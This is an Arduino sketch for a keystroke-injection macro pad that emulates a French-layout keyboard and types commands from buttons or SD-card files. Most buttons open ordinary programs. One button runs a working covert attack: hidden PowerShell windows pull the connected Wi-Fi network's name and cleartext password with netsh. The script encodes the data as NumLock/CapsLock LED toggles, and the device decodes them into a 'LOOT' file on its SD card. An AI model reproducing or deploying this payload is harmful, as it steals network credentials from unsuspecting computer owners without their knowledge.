#define HID_CUSTOM_LAYOUT
#define LAYOUT_FRENCH

#include "HID-Project.h"
#include <Keypad.h>
#include <SPI.h>
#include <SD.h>



#define COMMAND_DELAY 1000 // You may need to increase this delay if your target is slow
#define FILE_PREFIX "LOOT"   // must be uppercase
#define FILE_EXTENSION "TXT" // must be uppercase
#define FILE_DIGITS_STR "3"  // number padding size. Can be 1-9 and must be a string
#define FILE_DIGITS ((int)(FILE_DIGITS_STR[0] - '0')) // The actual number of digits
#define FILE_NAME_SIZE (strlen(FILE_PREFIX) + FILE_DIGITS + 1 + strlen(FILE_EXTENSION))
#define FILE_FMT_STR FILE_PREFIX "%0" FILE_DIGITS_STR "d." FILE_EXTENSION

#define BIT_CHANGED(a, b, mask) (((a) ^ (b)) & (mask)) // check if a bit indicated by mask changed from b to a

File myFile;

const int chipSelect = 10;

const char Button = 21;

const byte ROWS = 2; //four rows
const byte COLS = 4; //four columns
const int MAX_PRINT_SIZE = 127;

char keys[ROWS][COLS] = {
  {'1', '2','3', '4'},
  {'5', '6','7', '8'}
};



byte rowPins[ROWS] = {2, 3}; //connect to the row pinouts of the keypad
byte colPins[COLS] = {4, 5, 6, 7}; //connect to the column pinouts of the keypad

Keypad keypad = Keypad( makeKeymap(keys), rowPins, colPins, ROWS, COLS );

char InitializeSDCard(){
  //Serial.print("Initializing SD card...");
  if (!SD.begin(chipSelect)) {
    //Serial.println("initialization failed!");
    return -1;
  }
  //Serial.println("initialization done.");
  return 0;
}

char WriteFromSDCard(const char FileName[]){
  if (InitializeSDCard() != 0) return -1;
  short int mode = digitalRead(Button);
  
  myFile = SD.open(FileName, FILE_READ);
  
  while (myFile.available() && digitalRead(Button) == mode) {
    BootKeyboard.print(myFile.read());
    delay(10);
  }
  //close the file:
  myFile.close();
}

char WriteAndEnter(const char Text[]){
    BootKeyboard.print(Text);
    delay(COMMAND_DELAY);
    BootKeyboard.press(KEY_RETURN);
    BootKeyboard.releaseAll();
    return 0;
}

char OpenExe(const char Exe[]){
    // first open run by windows + r
    BootKeyboard.press(KEY_LEFT_GUI);
    BootKeyboard.press('r');
    BootKeyboard.releaseAll();

    // adjust delay accorqding to your requierment
    delay(COMMAND_DELAY);

    // write and press enter to open cmd
    WriteAndEnter(Exe);
    return 0;
}

/**
 * @brief Get a Loot File object
 * This function scans the root directory for the 
 * latest loot file and creates a new one with
 * the consecuting number.
 * 
 * @return The new loot File 
 */
File getLootFile()
{
  File root = SD.open("/");
  File entry;
  int i = -1;
  char *fname;

  // Get the biggest index
  while (entry = root.openNextFile())
  {
    fname = entry.name();
    if (strncmp(FILE_PREFIX, fname, strlen(FILE_PREFIX)) == 0 // file is loot file
        && strlen(fname) == FILE_NAME_SIZE) // fname correct length
    { 
      fname[strlen(FILE_PREFIX) + FILE_DIGITS] = '\0'; // get the index string
      int curr_i = atoi(fname + strlen(FILE_PREFIX)); // convert the index string to int
      i = max(curr_i, i); // keep the bigger value
    }
    entry.close();
  }

  // format file name
  sprintf(fname, FILE_FMT_STR, i + 1);
  
  return SD.open(fname, FILE_WRITE); // Open the file and return it
}

/**
 * @brief Exfiltrates data from host using keyboard LEDs
 * When the NumLock led changes state, 1 is recorded
 * When the CapsLock led changes state, 0 is recorded
 * When the ScrollLock led changes state the exfiltration is complete
 * @param out_file the file to write to
 */
void exfiltrate(File out_file) 
{
  uint8_t c_i = 0;
  uint8_t c = 0;
  uint8_t leds = BootKeyboard.getLeds();
  uint8_t last_leds = leds;

  while (!BIT_CHANGED(last_leds, leds = BootKeyboard.getLeds(), LED_SCROLL_LOCK)) // run until Scroll lock led changes
  {
    if (BIT_CHANGED(last_leds, leds, LED_NUM_LOCK)) // Num lock led changed
    {
      c <<= 1;
      c |= 1; // add 1 to c
      c_i++;
    }
    else if (BIT_CHANGED(last_leds, leds, LED_CAPS_LOCK)) // Caps lock led changed
    {
      c <<= 1;
      c |= 0;
      c_i++;
    }

    if (c_i == 8) // finished a byte
    {
      //Serial.print(c);
      out_file.write(c);
      c_i = 0; // add 0 to c
      c = 0;
    }

    last_leds = leds;
  }
}

void setup() {  
  //Serial.begin(9600);
  
  BootKeyboard.begin();
  InitializeSDCard();  
  
  delay(2000);
}

void loop() {
  
  char key = keypad.getKey();
  short int mode = digitalRead(Button);
  
  
  if (key != NO_KEY) {
      
//    Serial.print("Key pressed = ");
//    Serial.println(key);
//    Serial.print("Mode = ");
//    Serial.println(mode);

    switch(mode){
      case 0:
        switch(key){
          case '1' : //Bouton 1 : Affichage du ping
            WriteFromSDCard("Button1.txt");
            break;
            
          case '2' : 
            WriteFromSDCard("Button2.txt");
            break;

          case '3' :
            WriteFromSDCard("Button3.txt");
            break;
            
          case '4' :
            WriteFromSDCard("Button4.txt");
            break;
            
          case '5' :
            WriteFromSDCard("Button5.txt");
            break;
            
          case '6' :
            WriteFromSDCard("Button6.txt");
            break;
            
          case '7' :
            WriteFromSDCard("Button7.txt");
            break;
        }
        break;
        
      case 1 :
        switch(key){
          case '1' : //Bouton 1 : Show ping
            OpenExe("cmd /k color 0A & ping riot.nl /t");
            break;
            
          case '2' : 
            OpenExe("Taskmgr.exe");
            break;

          case '3' :
            OpenExe("opera.exe");
            break;
            
          case '4' :
            OpenExe("https://open.spotify.com");
            break;
            
          case '5' :
           // Create loot file
            File loot_file = getLootFile();
            OpenExe("Powershell -WindowStyle hidden -C \"netsh wlan show profile name=(Get-NetConnectionProfile)[0].Name key=clear|?{$_-match'Nom du SSID|Contenu de la clé'}|%{($_ -split':')[1]} | Out-File -encoding ascii $env:tmp\\z\"");
            delay(COMMAND_DELAY);
            OpenExe("Powershell -WindowStyle hidden -C \"foreach($b in $(cat $env:tmp\\z -En by)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'}else{$o+='%{CAPSLOCK}'}}}; $o+='%{SCROLLLOCK}';echo $o >$env:tmp\\z\"");
            delay(COMMAND_DELAY);
            OpenExe("Powershell -WindowStyle hidden \"$o=(cat $env:tmp\\z);Add-Type -A System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\\z\"");
            // Exfiltrate the data
            exfiltrate(loot_file);
            // Close the loot file
            loot_file.close();
            break;
            
          case '6' :
            BootKeyboard.println("test");
            break;
            
          case '7' :
            OpenExe("opera.exe");
            break;
            
        }
        break;
    }
  }    
}
